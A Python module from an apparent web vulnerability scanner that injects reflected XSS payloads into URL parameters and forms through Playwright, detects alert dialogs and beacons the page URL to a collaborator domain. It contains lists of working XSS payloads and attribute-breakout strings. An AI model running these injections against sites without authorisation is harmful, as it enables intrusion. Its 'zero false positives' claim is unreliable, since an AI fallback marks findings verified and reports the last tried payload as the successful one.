#!/usr/bin/env python3
"""
XSS Alert Detection Module - Verifies XSS by detecting actual JavaScript alerts
NO FALSE POSITIVES - Only reports XSS when alerts actually fire
"""

import asyncio
import logging
import json
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from datetime import datetime

logger = logging.getLogger("XSSAlertDetector")

class XSSAlertDetector:
    """
    XSS verification system that detects when JavaScript alerts actually execute
    Uses Playwright to intercept dialogs and take before/after screenshots
    """
    
    def __init__(self, config: Dict):
        self.config = config
        self.screenshot_dir = Path(config.get('screenshot_dir', 'screenshots'))
        self.screenshot_dir.mkdir(exist_ok=True)
        
        # AI model for visual alert detection (fallback)
        self.ai_model = None
        try:
            import os as _os
            import google.generativeai as genai
            api_key = None
            try:
                # Prefer explicit config, then environment
                api_key = (config or {}).get('gemini_api_key') or _os.getenv('GEMINI_API_KEY')
            except Exception:
                api_key = _os.getenv('GEMINI_API_KEY')
            if api_key:
                genai.configure(api_key=api_key)
                self.ai_model = genai.GenerativeModel('gemini-1.5-flash')
            else:
                logger.info("Gemini API key not provided; visual verification AI disabled")
        except Exception as e:
            logger.debug(f"AI not available for visual verification: {e}")
        
        logger.info("🚨 XSS Alert Detector initialized - ZERO FALSE POSITIVES mode")
    
    async def verify_xss_with_alert_detection(self, url: str, payload: str, 
                                            auth_cookie: Optional[str] = None,
                                            auth_domain: Optional[str] = None) -> Dict:
        """
        Verify XSS by actually executing the payload and detecting alerts
        
        Returns:
        {
            'verified': bool,              # True if alert actually fired
            'alert_text': str,             # Text content of alert dialog
            'screenshot_before': str,      # Screenshot before XSS
            'screenshot_after': str,       # Screenshot after XSS 
            'execution_log': List[str],    # JavaScript execution log
            'dialog_intercepted': bool     # True if dialog was intercepted
        }
        """
        try:
            from playwright.async_api import async_playwright
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            
            logger.info(f"🔍 VERIFYING XSS: {url} with payload: {payload[:100]}...")
            
            verification_result = {
                'verified': False,
                'alert_text': '',
                'screenshot_before': '',
                'screenshot_after': '',
                'execution_log': [],
                'dialog_intercepted': False,
                'error': '',
                'oob_marker': '',
                'oob_url': ''
            }
            
            async with async_playwright() as pw:
                # For alert detection, we need to run headless but intercept dialogs
                browser = await pw.chromium.launch(
                    headless=True,  # Must be headless in server environments
                    args=[
                        '--no-sandbox', 
                        '--disable-web-security',
                        '--disable-dev-shm-usage',
                        '--no-first-run',
                        '--disable-default-apps'
                    ]
                )
                
                context = await browser.new_context(
                    viewport={"width": 1366, "height": 768},
                    ignore_https_errors=True
                )
                
                # Add authentication if provided
                if auth_cookie and auth_domain:
                    await self._inject_auth_cookies(context, url, auth_cookie, auth_domain)
                
                page = await context.new_page()
                
                # JavaScript execution log
                js_log = []
                
                # Console message handler
                def handle_console_msg(msg):
                    js_log.append(f"CONSOLE: {msg.text}")
                    logger.debug(f"JS Console: {msg.text}")
                
                page.on('console', handle_console_msg)
                
                # Dialog interceptor - THIS IS THE KEY!
                dialog_intercepted = False
                alert_text = ''
                
                async def handle_dialog(dialog):
                    nonlocal dialog_intercepted, alert_text
                    dialog_intercepted = True
                    alert_text = dialog.message
                    logger.info(f"🚨 ALERT INTERCEPTED: {alert_text}")
                    
                    # Take screenshot with dialog visible
                    try:
                        screenshot_with_dialog = self._generate_screenshot_path(url, "alert_dialog")
                        await page.screenshot(path=str(screenshot_with_dialog))
                        verification_result['screenshot_alert_dialog'] = str(screenshot_with_dialog)
                        logger.info(f"📸 Dialog screenshot captured: {screenshot_with_dialog}")
                    except Exception as e:
                        logger.error(f"Failed to capture dialog screenshot: {e}")
                    
                    # Accept dialog to continue
                    try:
                        await dialog.accept()
                    except Exception as e:
                        logger.error(f"Failed to accept dialog: {e}")
                
                page.on('dialog', handle_dialog)
                
                # Step 1: Take screenshot BEFORE XSS injection
                try:
                    await page.goto(url, wait_until='domcontentloaded', timeout=15000)
                    await page.wait_for_timeout(1000)  # Let page settle
                    
                    screenshot_before = self._generate_screenshot_path(url, "before_xss")
                    await page.screenshot(path=str(screenshot_before))
                    verification_result['screenshot_before'] = str(screenshot_before)
                    logger.debug(f"📸 Before screenshot: {screenshot_before}")
                except Exception as e:
                    verification_result['error'] = f"Failed to take before screenshot: {e}"
                    logger.error(f"Before screenshot failed: {e}")
                
                # Step 2: Get adaptive payloads based on reflection context  
                logger.info(f"🧠 Analyzing reflection context for {url}")
                adaptive_payloads = await self._analyze_reflection_context(url, auth_cookie, auth_domain)
                logger.info(f"🎯 Testing {len(adaptive_payloads)} context-aware payloads")
                
                # Step 3: Test adaptive payloads and wait for alert
                try:
                    last_test_url = ''
                    last_payload = ''
                    last_param = ''
                    # Parse URL and inject payload
                    parsed = urlparse(url)
                    query_params = parse_qs(parsed.query, keep_blank_values=True)
                    
                    if query_params:
                        # Test each parameter with adaptive payloads
                        for param_name in query_params.keys():
                            for adaptive_payload in adaptive_payloads:
                                if dialog_intercepted:
                                    break  # Found working XSS, stop testing
                                    
                                test_params = query_params.copy()
                                test_params[param_name] = [adaptive_payload]
                                
                                test_query = urlencode(test_params, doseq=True)
                                test_url = urlunparse((
                                    parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, test_query, parsed.fragment
                                ))
                                
                                logger.info(f"🧪 Testing adaptive XSS on '{param_name}': {adaptive_payload[:50]}...")
                                last_test_url = test_url
                                last_payload = adaptive_payload
                                last_param = param_name
                                
                                # Navigate to XSS test URL
                                await page.goto(test_url, wait_until='domcontentloaded', timeout=15000)
                                
                                # Wait for potential alert
                                await page.wait_for_timeout(2000)
                                
                                if dialog_intercepted:
                                    # Update verification result with successful payload
                                    verification_result['successful_payload'] = adaptive_payload
                                    verification_result['successful_parameter'] = param_name
                                    verification_result['test_url'] = test_url
                                    logger.info(f"✅ ADAPTIVE XSS SUCCESS: '{param_name}' with payload: {adaptive_payload}")
                                    break  # Found working XSS, stop testing
                                    
                            if dialog_intercepted:
                                break  # Found working XSS, stop testing parameters
                    
                    else:
                        # No query params, try form injection with adaptive payloads
                        for adaptive_payload in adaptive_payloads[:5]:  # Test first 5 adaptive payloads on forms
                            if dialog_intercepted:
                                break
                            last_payload = adaptive_payload
                            last_param = '(form)'
                            await self._test_form_xss_injection(page, url, adaptive_payload, js_log)
                            await page.wait_for_timeout(2000)
                            if dialog_intercepted:
                                verification_result['successful_payload'] = adaptive_payload
                                verification_result['successful_method'] = 'form_injection'
                                verification_result['test_url'] = url
                                break
                    
                    # Step 3: Take screenshot AFTER XSS attempt
                    screenshot_after = self._generate_screenshot_path(url, "after_xss")
                    await page.screenshot(path=str(screenshot_after))
                    verification_result['screenshot_after'] = str(screenshot_after)
                    logger.debug(f"📸 After screenshot: {screenshot_after}")
                    
                except Exception as e:
                    verification_result['error'] = f"XSS injection failed: {e}"
                    logger.error(f"XSS injection failed: {e}")
                
                # Step 3.5: Send OOB beacon for external confirmation (if configured)
                try:
                    # Prefer collaborator.base_domain, fallback to blind_xss_domain
                    collab_cfg = (self.config.get('collaborator') or {}) if isinstance(self.config, dict) else {}
                    base_dom = (collab_cfg.get('base_domain') or self.config.get('blind_xss_domain') or '').strip()
                    use_https = bool(collab_cfg.get('https', True))
                    if base_dom:
                        import time, secrets
                        marker = f"XSS_{int(time.time())}_{secrets.token_hex(4)}"
                        scheme = 'https' if use_https else 'http'
                        oob_url = f"{scheme}://{base_dom}/oob/xss/{marker}?u="
                        # Fire beacon from the page context (will execute in any verified flow)
                        try:
                            await page.evaluate("(u)=>{try{new Image().src=u+encodeURIComponent(location.href);}catch(e){}}", oob_url)
                        except Exception:
                            pass
                        verification_result['oob_marker'] = marker
                        verification_result['oob_url'] = f"{oob_url}(target)"
                        logger.info(f"📡 OOB beacon queued: {verification_result['oob_url']}")
                except Exception as e:
                    logger.debug(f"OOB beacon setup failed: {e}")

                # Step 4: Collect results
                verification_result['verified'] = dialog_intercepted
                verification_result['alert_text'] = alert_text
                verification_result['dialog_intercepted'] = dialog_intercepted
                verification_result['execution_log'] = js_log
                # If later AI verification marks as verified but we don't have payload, keep last tried values
                if not verification_result.get('successful_payload') and last_payload:
                    verification_result['last_tried_payload'] = last_payload
                if not verification_result.get('test_url') and last_test_url:
                    verification_result['last_tried_url'] = last_test_url
                if not verification_result.get('successful_parameter') and last_param:
                    verification_result['last_tried_parameter'] = last_param
                
                await browser.close()
            
            # Log verification result
            if verification_result['verified']:
                logger.info(f"✅ XSS VERIFIED - Alert fired: '{alert_text}' at {url}")
            else:
                logger.info(f"❌ XSS NOT VERIFIED - No alert detected at {url}")
                
                # Try AI visual verification as fallback
                if self.ai_model and verification_result['screenshot_before'] and verification_result['screenshot_after']:
                    ai_result = await self._ai_visual_verification(
                        verification_result['screenshot_before'],
                        verification_result['screenshot_after']
                    )
                    if ai_result:
                        verification_result['verified'] = True
                        verification_result['alert_text'] = 'Visually detected by AI'
                        # Fill in best-effort payload/URL context so UI shows something meaningful
                        if not verification_result.get('successful_payload') and verification_result.get('last_tried_payload'):
                            verification_result['successful_payload'] = verification_result['last_tried_payload']
                        if not verification_result.get('test_url') and verification_result.get('last_tried_url'):
                            verification_result['test_url'] = verification_result['last_tried_url']
                        if not verification_result.get('successful_parameter') and verification_result.get('last_tried_parameter'):
                            verification_result['successful_parameter'] = verification_result['last_tried_parameter']
                        logger.info("🤖 AI detected visual XSS evidence")
            
            return verification_result
            
        except Exception as e:
            logger.error(f"XSS verification failed for {url}: {e}")
            return {
                'verified': False,
                'error': str(e),
                'alert_text': '',
                'screenshot_before': '',
                'screenshot_after': '',
                'execution_log': [],
                'dialog_intercepted': False
            }
    
    async def _analyze_reflection_context(self, url: str, auth_cookie: Optional[str] = None, auth_domain: Optional[str] = None) -> List[str]:
        """
        Analyze how payloads are reflected and generate context-aware XSS payloads
        Returns list of payloads adapted to the reflection context
        """
        adaptive_payloads = []
        
        try:
            from playwright.async_api import async_playwright
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            
            # Test marker to see how it reflects
            test_marker = "XSSTEST_REFLECTION_MARKER_12345"
            
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(headless=True, args=['--no-sandbox'])
                context = await browser.new_context(ignore_https_errors=True)
                
                if auth_cookie and auth_domain:
                    await self._inject_auth_cookies(context, url, auth_cookie, auth_domain)
                
                page = await context.new_page()
                
                # Test reflection in different contexts
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query, keep_blank_values=True)
                
                if query_params:
                    for param_name in list(query_params.keys())[:3]:  # Test first 3 params
                        try:
                            # Test with reflection marker
                            test_params = query_params.copy()
                            test_params[param_name] = [test_marker]
                            
                            test_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, test_query, parsed.fragment
                            ))
                            
                            await page.goto(test_url, wait_until='domcontentloaded', timeout=10000)
                            page_content = await page.content()
                            
                            # Analyze reflection context
                            context_payloads = self._generate_context_aware_payloads(
                                page_content, test_marker, param_name
                            )
                            adaptive_payloads.extend(context_payloads)
                            
                        except Exception as e:
                            logger.debug(f"Context analysis failed for param {param_name}: {e}")
                            continue
                
                await browser.close()
            
            # Remove duplicates and add fallback payloads
            unique_payloads = list(dict.fromkeys(adaptive_payloads))  # Preserve order
            
            # Add universal fallback payloads
            fallback_payloads = [
                "<script>alert('XSS_MODSCAN')</script>",
                "<img src=x onerror=alert('XSS_MODSCAN')>",
                "<svg onload=alert('XSS_MODSCAN')>",
                "javascript:alert('XSS_MODSCAN')",
                '"><script>alert("XSS_MODSCAN")</script>',
            ]
            
            # Combine adaptive + fallback
            final_payloads = unique_payloads + [p for p in fallback_payloads if p not in unique_payloads]
            
            logger.info(f"🧠 Generated {len(unique_payloads)} adaptive + {len(fallback_payloads)} fallback payloads")
            return final_payloads[:10]  # Limit to 10 best payloads
            
        except Exception as e:
            logger.error(f"Context analysis failed: {e}")
            # Return basic payloads as fallback
            return [
                "<script>alert('XSS_MODSCAN')</script>",
                "<img src=x onerror=alert('XSS_MODSCAN')>",
                "<svg onload=alert('XSS_MODSCAN')>"
            ]
    
    def _generate_context_aware_payloads(self, page_content: str, test_marker: str, param_name: str) -> List[str]:
        """
        Generate XSS payloads based on how the test marker was reflected
        """
        payloads = []
        marker_unique_id = "XSS_MODSCAN"
        
        if test_marker not in page_content:
            logger.debug(f"Test marker not reflected for param {param_name}")
            return payloads
        
        # Find all occurrences of the marker
        marker_positions = []
        start = 0
        while True:
            pos = page_content.find(test_marker, start)
            if pos == -1:
                break
            marker_positions.append(pos)
            start = pos + 1
        
        logger.info(f"🔍 Found test marker in {len(marker_positions)} positions for param {param_name}")
        
        for pos in marker_positions:
            # Analyze context around the marker
            context_before = page_content[max(0, pos-100):pos].lower()
            context_after = page_content[pos+len(test_marker):pos+len(test_marker)+100].lower()
            
            # HTML context detection and adaptive payloads
            if 'value="' in context_before and '"' in context_after:
                # Inside input value attribute
                logger.debug(f"📍 {param_name}: Reflected in input value attribute")
                payloads.extend([
                    f'"><script>alert("{marker_unique_id}")</script><input value="',
                    f'" onfocus=alert("{marker_unique_id}") autofocus="',
                    f'" onmouseover=alert("{marker_unique_id}") "',
                ])
                
            elif 'value=\'' in context_before and '\'' in context_after:
                # Inside single-quoted input value
                logger.debug(f"📍 {param_name}: Reflected in single-quoted input value")
                payloads.extend([
                    f"'><script>alert('{marker_unique_id}')</script><input value='",
                    f"' onfocus=alert('{marker_unique_id}') autofocus='",
                ])
                
            elif '<script' in context_before and '</script>' in context_after:
                # Inside script tags
                logger.debug(f"📍 {param_name}: Reflected inside script tags")
                payloads.extend([
                    f';alert("{marker_unique_id}");//',
                    f'</script><script>alert("{marker_unique_id}")</script><script>',
                    f"';alert('{marker_unique_id}');//",
                ])
                
            elif any(tag in context_before for tag in ['<title', '<h1', '<h2', '<h3', '<p', '<div', '<span']):
                # Inside HTML tags
                logger.debug(f"📍 {param_name}: Reflected in HTML content")
                payloads.extend([
                    f'<script>alert("{marker_unique_id}")</script>',
                    f'<img src=x onerror=alert("{marker_unique_id}")>',
                    f'<svg onload=alert("{marker_unique_id}")>',
                ])
                
            elif 'href="' in context_before:
                # Inside href attribute
                logger.debug(f"📍 {param_name}: Reflected in href attribute")
                payloads.extend([
                    f'javascript:alert("{marker_unique_id}")',
                    f'" onclick=alert("{marker_unique_id}") href="',
                ])
                
            elif any(attr in context_before for attr in ['onclick="', 'onload="', 'onerror="', 'onfocus="']):
                # Inside event handler attribute
                logger.debug(f"📍 {param_name}: Reflected in event handler")
                payloads.extend([
                    f'alert("{marker_unique_id}")',
                    f';alert("{marker_unique_id}");//',
                ])
                
            else:
                # Generic HTML context
                logger.debug(f"📍 {param_name}: Generic HTML context")
                payloads.extend([
                    f'<script>alert("{marker_unique_id}")</script>',
                    f'<img src=x onerror=alert("{marker_unique_id}")>',
                ])
        
        # Remove duplicates while preserving order
        unique_payloads = []
        seen = set()
        for payload in payloads:
            if payload not in seen:
                unique_payloads.append(payload)
                seen.add(payload)
        
        logger.info(f"🎯 Generated {len(unique_payloads)} context-aware payloads for {param_name}")
        return unique_payloads
    
    async def _inject_auth_cookies(self, context, url: str, auth_cookie: str, auth_domain: str):
        """Inject authentication cookies into browser context"""
        try:
            from urllib.parse import urlparse
            
            parsed = urlparse(url)
            scope_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # Parse cookie string
            cookie_map = {}
            if isinstance(auth_cookie, str):
                parts = [p.strip() for p in auth_cookie.split(';') if p.strip()]
                for part in parts:
                    if '=' in part:
                        k, v = part.split('=', 1)
                        cookie_map[k.strip()] = v.strip()
            
            # Convert to Playwright format (FIXED COOKIE FORMAT)
            pw_cookies = []
            for name, value in cookie_map.items():
                pw_cookies.append({
                    'name': name,
                    'value': value,
                    'domain': parsed.hostname,  # Use domain instead of url (FIXED)
                    'path': '/',
                    'httpOnly': False,
                    'secure': parsed.scheme == 'https',
                })
            
            if pw_cookies:
                await context.add_cookies(pw_cookies)
                logger.debug(f"🔑 Added {len(pw_cookies)} auth cookies")
        
        except Exception as e:
            logger.error(f"Failed to inject auth cookies: {e}")
    
    async def _test_form_xss_injection(self, page, url: str, payload: str, js_log: List[str]):
        """Test XSS injection via forms on the page"""
        try:
            # Find all forms
            forms = await page.query_selector_all('form')
            logger.debug(f"Found {len(forms)} forms for XSS testing")
            
            for i, form in enumerate(forms):
                try:
                    # Find input fields
                    inputs = await form.query_selector_all('input[type="text"], input[type="search"], textarea')
                    
                    for input_elem in inputs:
                        try:
                            # Clear and inject payload
                            await input_elem.clear()
                            await input_elem.fill(payload)
                            logger.debug(f"Injected XSS payload into form {i} input")
                            
                            # Submit form
                            submit_btn = await form.query_selector('input[type="submit"], button[type="submit"]')
                            if submit_btn:
                                await submit_btn.click()
                                await page.wait_for_timeout(2000)  # Wait for response
                                break  # Only test first input per form
                            
                        except Exception as e:
                            logger.debug(f"Form input injection failed: {e}")
                            continue
                
                except Exception as e:
                    logger.debug(f"Form {i} testing failed: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"Form XSS testing failed: {e}")
    
    def _generate_screenshot_path(self, url: str, suffix: str) -> Path:
        """Generate unique screenshot path with suffix"""
        import hashlib
        from urllib.parse import urlparse
        
        parsed = urlparse(url)
        hostname = parsed.netloc.replace(':', '_').replace('/', '_')
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        
        filename = f"xss_verify_{hostname}_{url_hash}_{suffix}.png"
        return self.screenshot_dir / filename
    
    async def _ai_visual_verification(self, before_screenshot: str, after_screenshot: str) -> bool:
        """Use AI to visually detect if an alert dialog appeared"""
        try:
            if not self.ai_model:
                return False
            
            # Read screenshots
            before_path = Path(before_screenshot)
            after_path = Path(after_screenshot)
            
            if not before_path.exists() or not after_path.exists():
                return False
            
            prompt = """
Compare these two screenshots taken before and after an XSS payload injection.
Look for signs that a JavaScript alert dialog appeared:

1. Modal dialog boxes
2. Alert/confirm/prompt popups  
3. Browser dialog overlays
4. Any popup windows or dialogs

Return JSON: {"alert_detected": true/false, "confidence": 0.0-1.0, "description": "what you see"}
"""
            
            # Upload both images to AI
            import google.generativeai as genai
            
            before_img = genai.upload_file(str(before_path))
            after_img = genai.upload_file(str(after_path))
            
            response = self.ai_model.generate_content([
                prompt,
                "Before XSS:", before_img,
                "After XSS:", after_img
            ])
            
            # Parse AI response
            result = json.loads(response.text.strip())
            
            if result.get('alert_detected') and result.get('confidence', 0) > 0.7:
                logger.info(f"🤖 AI detected visual alert: {result.get('description')}")
                return True
            
            return False
            
        except Exception as e:
            logger.debug(f"AI visual verification failed: {e}")
            return False
    
    async def batch_verify_xss_findings(self, findings: List[Dict]) -> List[Dict]:
        """Batch verify multiple XSS findings to eliminate false positives"""
        verified_findings = []
        
        logger.info(f"🔍 Batch verifying {len(findings)} XSS findings...")
        
        for finding in findings:
            try:
                url = finding.get('url', '')
                payload = finding.get('payload', '')
                
                if not url or not payload:
                    logger.warning(f"Skipping invalid finding: {finding}")
                    continue
                
                # Verify the XSS with proper auth cookies
                from urllib.parse import urlparse
                parsed = urlparse(url)
                auth_domain = parsed.netloc
                # Get auth cookies from config for this domain (matches vulnerability scanner logic)
                auth_cookie = None
                if hasattr(self.config, 'get') and self.config.get('cookie_overrides'):
                    domains = self.config.get('cookie_overrides', {}).get('domains', {})
                    if auth_domain in domains:
                        default_level = domains[auth_domain].get('default_level', 'low')
                        security_levels = domains[auth_domain].get('security_levels', {})
                        if default_level in security_levels:
                            auth_cookie = security_levels[default_level]
                
                verification = await self.verify_xss_with_alert_detection(url, payload, auth_cookie, auth_domain)
                
                if verification['verified']:
                    # Update finding with verification evidence
                    finding['verified'] = True
                    finding['alert_text'] = verification['alert_text']
                    finding['screenshot_before'] = verification['screenshot_before']
                    finding['screenshot_after'] = verification['screenshot_after']
                    finding['verification_log'] = verification['execution_log']
                    finding['confidence'] = 0.95  # High confidence for verified alerts
                    
                    verified_findings.append(finding)
                    logger.info(f"✅ XSS VERIFIED: {url}")
                else:
                    logger.info(f"❌ XSS FALSE POSITIVE ELIMINATED: {url}")
                
                # Rate limiting
                await asyncio.sleep(1)
                
            except Exception as e:
                logger.error(f"Verification failed for finding {finding}: {e}")
        
        logger.info(f"🎯 VERIFICATION COMPLETE: {len(verified_findings)}/{len(findings)} XSS findings verified")
        return verified_findings
